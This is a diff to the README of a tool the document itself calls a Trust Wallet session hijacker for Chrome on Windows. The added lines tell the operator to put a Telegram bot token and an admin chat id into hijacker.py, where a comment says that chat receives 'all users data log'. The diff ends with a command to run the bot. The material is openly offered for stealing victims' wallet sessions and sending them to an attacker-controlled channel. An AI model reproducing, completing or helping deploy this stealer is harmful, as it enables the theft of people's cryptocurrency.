@@ -39,3 +39,18 @@ python script for make trust wallet session hijacker in chrome (win) and hijack 
    bot = telebot.TeleBot("TELEGRAM_BOT_TOKEN", parse_mode="html")   # <------- edit this line
    admin = -1001797987215 #admin chat id                            # <------- edit this line
    ```
+
+2. ** Edit hijacker.py (add telegram bot token and admin chat id**
+   ```python
+   tel_bot = telebot.TeleBot(token="TELEGRAM_BOT_TOKEN")            # <------- edit this line
+   chat_id = CHATX_IDX_X
+   admin = -1001797987215 # admin chat id for all users data log    # <------- edit this line
+   ```
+
+
+## run bot in windows server or ...
+
+- run
+  ```sh
+  python3 bot.py
+  ```
